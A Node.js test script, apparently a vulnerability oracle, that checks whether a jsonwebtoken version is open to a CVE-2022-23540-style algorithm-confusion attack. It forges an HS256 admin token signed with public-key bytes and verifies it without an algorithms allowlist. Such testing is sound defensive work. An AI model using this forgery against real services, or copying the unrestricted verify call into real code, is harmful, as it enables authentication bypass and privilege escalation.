const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');
const jwt = require('jsonwebtoken');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

try {
  const markerDir = path.join(os.tmpdir(), 'jwt-oracle-' + process.pid + '-' + Date.now());
  fs.mkdirSync(markerDir, { recursive: true });

  // Benign operation: HS256 sign/verify must work first.
  const benignPayload = { sub: 'user123', ok: true };
  const benignSecret = 'benign-secret';
  const benignToken = jwt.sign(benignPayload, benignSecret, { algorithm: 'HS256' });
  const benignDecoded = jwt.verify(benignToken, benignSecret, { algorithms: ['HS256'] });
  if (!benignDecoded || benignDecoded.sub !== 'user123' || benignDecoded.ok !== true) {
    throw new Error('benign HS256 verify failed');
  }

  operation_completed = true;

  // Malicious operation (CVE-2022-23540 style):
  // Provide an asymmetric public key in DER bytes (Buffer), then verify a forged HS256 token
  // signed with those same bytes as HMAC secret, with no explicit algorithms allowlist.
  // Vulnerable versions may treat non-string key material ambiguously and accept it.
  const pubDerB64 = 'MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAK08uN4M9V6Q8mG2VfQ0m8Yd9YQvR5Qf7n6k8V5j2h8m7n5p9v4t1q3d5c7b9a2e4g6i8k0m2o4q6s8u0w2y4A0CAwEAAQ==';
  const publicKeyDer = Buffer.from(pubDerB64, 'base64');

  const attackerPayload = { sub: 'attacker', admin: true };
  const forged = jwt.sign(attackerPayload, publicKeyDer, { algorithm: 'HS256' });

  try {
    const out = jwt.verify(forged, publicKeyDer);
    exploit_succeeded = !!(out && out.sub === 'attacker' && out.admin === true);
    evidence = exploit_succeeded
      ? 'verify accepted forged HS256 token using asymmetric key bytes without algorithms restriction'
      : 'verify returned unexpected payload shape';
  } catch (e) {
    exploit_succeeded = false;
    evidence = 'malicious verify rejected: ' + (e && e.message ? e.message : String(e));
  }
} catch (e) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'setup/benign failure: ' + (e && e.message ? e.message : String(e));
}

console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));